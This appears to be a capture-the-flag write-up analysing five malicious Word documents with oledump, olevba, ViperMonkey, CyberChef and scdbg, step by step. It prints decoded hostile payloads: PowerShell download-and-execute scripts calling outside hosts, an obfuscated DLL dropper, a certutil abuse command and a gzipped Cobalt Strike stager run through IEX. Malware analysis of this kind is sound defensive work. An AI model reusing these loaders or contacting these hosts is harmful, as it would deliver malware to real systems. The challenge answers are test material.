#### Attacker 1
1. analyzing the doc file
```shell
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker1.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:     13859 '1Table'
  5:     33430 'Data'
  6:       365 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M    9852 'Macros/VBA/ThisDocument'
  9:      5460 'Macros/VBA/_VBA_PROJECT'
 10:       513 'Macros/VBA/dir'
 11:       306 'MsoDataStore/ÇYÕXGNÎÕÃUKWÛÎIS2BKÍÐÐ==/Item'
 12:       341 'MsoDataStore/ÇYÕXGNÎÕÃUKWÛÎIS2BKÍÐÐ==/Properties'
 13:      4096 'WordDocument'
```
2. First I looked for strings with `oledump.py attacker1.doc -s 1 -S` on every stream
3. I didn't directly find a domain in the strings, but there was a very long string in stream 4 that seemed to be base64 encoded with extra `[` characters
```
[ ... SNIP ... ]
[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[EE[YwB0[Gk[dgBh[HQ[bwBy[F0[Og[6[EM[cgBl[GE[d[Bl[Ek[bgBz[HQ[YQBu[GM[ZQ[o[CI[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[CI[KQ[7[[0[Cg[k[G0[ZQB0[Gg[bwBk[C[[PQ[g[Fs[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[F0[LgBH[GU[d[BN[GU[d[Bo[G8[Z[Bz[Cg[KQ[7[[0[CgBm[G8[cgBl[GE[YwBo[Cg[J[Bt[C[[aQBu[C[[J[Bt[GU[d[Bo[G8[Z[[p[Hs[DQ[K[[0[Cg[g[C[[aQBm[Cg[J[Bt[C4[TgBh[G0[ZQ[g[C0[ZQBx[C[[IgBE[G8[dwBu[Gw[bwBh[GQ[UwB0[HI[aQBu[Gc[Ig[p[Hs[DQ[K[C[[I[[g[C[[d[By[Hk[ew[N[[o[I[[g[C[[I[[g[CQ[dQBy[Gk[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[FM[eQBz[HQ[ZQBt[C4[VQBy[Gk[K[[i[Gg[d[B0[H[[Og[v[
[ ... SNIP ... ]
```
4. From this I decided to inspect the macro to search for clues
5. The `M` on VBA steam 8 means that it contains a VBA macro
6. VBA decode with `oledump.py attacker1.doc -s 8 -v`
```
[ ... SNIP ... ]
   VBA.Shell# "CmD /C " + Trim(rjvFRbqzLtkzn) + SKKdjMpgJRQRK + Trim(Replace(pNHbvwXpnbZvS.AlternativeText + "", "[", "A")) + hdNxDVBxCTqQTpB + RJzJQGRzrc + CWflqnrJbKVBj, CInt(351 * 2 + -702)
[ ... SNIP ... ]
```
7. Replacing `A` with `[`  lines up with the encoded string we found before
8. I pasted the command block into cyberchef, used find and replace to replace the `[`'s with `A`'s, then base64 decoded i
9. Null bytes weren't going away so i used a different site, pasted the output into my own editor, and used find and replace locally to get rid of non alphabetical characters
```
$instance = [System.Activator]::CreateInstance("System.Net.WebClient");
$method = [System.Net.WebClient].GetMethods();
foreach($m in $method){


  if($m.Name -eq "DownloadString"){
    try{
     $uri = New-Object System.Uri("http://176.32.35.16/704e.php")
     IEX($m.Invoke($instance, ($uri)));
    }catch{}


  }


  if($m.Name -eq "DownloadData"){
     try{
     $uri = New-Object System.Uri("http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas")
     $response = $m.Invoke($instance, ($uri));


     $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";
     [System.IO.File]::WriteAllBytes($path, $response);


     $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
     $type = [Type]::GetTypeFromCLSID($clsid)
     $object = [Activator]::CreateInstance($type)
     $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)


     }catch{}
     
  }
} 

Exit;
```
10. Answers to the first two questions are readable in the code, but the folder path for question 3 is `%ProgramData%`
11.  This is because that is the folder that `"CommonApplicationData"` points to
12. To find the `COM` object, we can look up the clsid from this line `$clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'`
13. I found this line in the description of a search result
```
Please note the following before proceeding: “C08AFD90-F2A1-11D1-8455-00A0C91F3880” is the Class ID (CLSID) for ShellBrowserWindow
```
14. So the `COM` object is called `ShellBrowserWindow`
15. The next question is also in plain text in the code, so now we on to finding the phone number
16. This was in stream 3 (and the bottom of stream 4)
```
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker1.doc -s 3 -S
Networked multi-state projection
West Virginia  Samanta
213-446-1757 x7135
Re-contextualized radical service-desk
Normal
 Windows
Microsoft Office Word
```
17. To find the keyword I used `olevba attacker1.doc`
18. The type `AutoExec` is listed next to the keyword `AutoOpen`
19. To find the subject I used `olemeta`
20. `olemeta` also has a last saved time, but that wasn't the correct answer so I used the hint and found it with `oletimes` instead
21. The stream that contains a macro is the VBA steam `8` which we figured out before and the name is only the last section `ThisDocument`

#### Attacker 2
1. Same process as before for finding the streams that contain macros
```
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker2.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7427 '1Table'
  5:     63641 'Data'
  6:        97 'Macros/Form/\x01CompObj'
  7:       283 'Macros/Form/\x03VBFrame'
  8:     63528 'Macros/Form/f'
  9:      2220 'Macros/Form/o'
 10:       566 'Macros/PROJECT'
 11:        92 'Macros/PROJECTwm'
 12: M    6655 'Macros/VBA/Form'
 13: M   15671 'Macros/VBA/Module1'
 14: M    1593 'Macros/VBA/ThisDocument'
 15:     42465 'Macros/VBA/_VBA_PROJECT'
 16: M    2724 'Macros/VBA/bxh'
 17:      1226 'Macros/VBA/dir'
 18:      4096 'WordDocument'
```
2. Question 3 can also be answered with this output
3. For question 2, I added the `-i` flag to the command which adds a new column specifying the amount of compiled bytes
```
13: M   15671  13867+1804 'Macros/VBA/Module1'
```
4. The first number in the addition is the size of the compiled macro
5. To find the 'fun' field, I output all the VBA stream info with the `-s a` option
```sh
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker2.doc -s a -v | grep fun | rev

))84(rhC ,)"cmd /k cscript.exe C:\ProgramData\pin.vbs"(esreveRrtS(llehS = nuf
```
6. To find the first domain I used the strings search option on all the streams with `-s a -S` then grepped for `http`
7. The first domain wasn't suspicious, so I scrolled through the output until I found one that looked malicious, which was `https://priyacareers.com/u9hDQN9Yy7g/pt.html` (remove the `https://` for submission)
8. The answer to the next question was right under this in the output
9. Here is a sample of the output:
```
LL1 = "$Nano='JOOEX'.replace('JOO','I');sal OY $Nano;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\ProgramData\www1.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"
```
10. For each referenced domain, you can find the corresponding downloaded `.dll` file
11. The next few questions about number of dlls and destination paths can be answered from this output as well
12. To find the program used to run dlls I just ran strings on the entire file because it wasn't visible in the previous output found the answer at the bottom
```
strings attacker2.doc | grep dll
```
14. To find the sleep amount I just repeated my previous command, grepping for `sleep` instead of `http`
15. For the last question I narrowed down the possible streams to 8 and 9 based on the answer format and checked both, ending up with `Macros/Form/o` stream 9

#### Attacker 3
1. Started by running `oledump.py` to get a baseline overview
```
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker3.doc 
A: word/vbaProject.bin
 A1:       423 'PROJECT'
 A2:        53 'PROJECTwm'
 A3: M    2017 'VBA/T'
 A4: m    1127 'VBA/ThisDocument'
 A5:      2976 'VBA/_VBA_PROJECT'
 A6:      1864 'VBA/__SRP_0'
 A7:       190 'VBA/__SRP_1'
 A8:       348 'VBA/__SRP_2'
 A9:       106 'VBA/__SRP_3'
A10: M    1291 'VBA/d'
A11:       723 'VBA/dir'
```
2. For the first question, I ran strings through `oledump` and grepped for `exe` files
```
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker3.doc -s a -S | grep exe
cmd /c set u=tutil&&call copy C:\Windows\System32\cer%u%.exe C:\ProgramData\1.exe
```
3. For the next question, we can see from the line above that the file `cer%u%.exe` is obfuscated by removing two sections of the name
4. Based on the command (or just inferring) we can find that the full name is `certutil`
5. To find the malicious `URI`, I tried grepping for `http` though VBA and string filters, but I got no results
6. After searching around a bit, I found the tool `vipermonkey`, a tool for VBA macro emulation, preinstalled on the VM
7. I ran `vmonkey attacker3.doc`, and found the URI in the `INFO` output, as well as the folder where the binary gets dropped (`ProgramData` as usual)
8. For the last question I just ran strings through `oldeump` and grepped for `1.exe` until I found the right stream

#### Attacker 4
1. I started off with `oledump`
```
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker4.doc 
  1:       113 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      4096 '1Table'
  5:       438 'Macros/PROJECT'
  6:        41 'Macros/PROJECTwm'
  7: M   17216 'Macros/VBA/ThisDocument'
  8:     10917 'Macros/VBA/_VBA_PROJECT'
  9:       515 'Macros/VBA/dir'
 10:      4142 'WordDocument'
```
2. Then analyzed the VBA with the macro with this command `oledump.py attacker4.doc -s 7 -v`
3. Searching for encoded strings, I found this section which appeared to be a collection of hex encoded text
```
Environ(XORI(Hextostring("3C3F3A03"), Hextostring("687A7753"))) & XORI(Hextostring("1217092B0F0718371F1F133560362807"), Hextostring("4E535062"))
```
4. I scrolled back up to find the first instance of hex encoding which was this:
```
Set VPBCRFOQENN = CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267417269")))
```
5. Since there is a `XOR` operation I pasted the first string into cyberchef, hex decoded it, then XORed it with the second string resulting in `MSXML2.XMLHTTP`
6. For the next question, I grepped out all the strings with `XORI`, pasted them into cyberchef, and decoded them with the same strategy until I found the binary, which was using the hex encoded string `1217092B0F0718371F1F133560362807`
7. There aren't many 4 character folder names, so I just assumed `Temp` for the next answer
8. I extracted the second binary and domain answers from the string `1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811`

#### Attacker 5
1. you know the drill, `oledump` for the overview
```
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ oledump.py attacker5.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7157 '1Table'
  5:        97 'Macros/CatchMeIfYouCan/\x01CompObj'
  6:       313 'Macros/CatchMeIfYouCan/\x03VBFrame'
  7:      7566 'Macros/CatchMeIfYouCan/f'
  8:        84 'Macros/CatchMeIfYouCan/o'
  9:       557 'Macros/PROJECT'
 10:       113 'Macros/PROJECTwm'
 11: M    1473 'Macros/VBA/CatchMeIfYouCan'
 12: M     994 'Macros/VBA/Module1'
 13: m     924 'Macros/VBA/ThisDocument'
 14:      3394 'Macros/VBA/_VBA_PROJECT'
 15:       889 'Macros/VBA/dir'
 16:      4096 'WordDocument'
```
3. For the first question I did a basic case insensitive grep with strings on the file for `caption`
```
strings attacker5.doc | grep -i caption
   Caption         =   "CobaltStrikeIsEverywhere"
```
4. Dumping all the files with `-s a S` I found a really long base64 encoded string
5. Decoding it and removing null bytes 
```
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
6. Based on the line `IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();` this also appears to be compressed using `gunzip`
7. I removed the plaintext commands from around the string base64 decoded it again and used the cyberchef `gunzip` option
8. At the bottom of the output was `-bxor 35`, which is the number we're looking for
9. To find the IP, paste the script output into cyberchef and XOR it with the key `35`. There is a readable IP address at the bottom of the output, as well as a user agent `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)`
10. Since cobalt strike C2s are usually known, I grabbed the `sha256sum` of the doc file, looked it up on virustotal, and found the path in the relations tab
```
ubuntu@ip-10-10-50-135:~/Desktop/maldocs$ sha256sum attacker5.doc 
55c9ff8f829bf0d5bbec83127570ad149bd18bc0351c59933090af917b4451db  attacker5.doc
```
11. The port number is also available in the relations tab
12. The apis can be found by downloading the file we decoded ealier from cyberchef and loading it into `scdbgc` with the command `scdbgc -f download.dat -s -1`
13. The APIs are in the output
```
[ ... SNIP ... ]
4010a2 LoadLibraryA(wininet)
4010b0 InternetOpenA()
[ ... SNIP ... ]
```
14. Done!
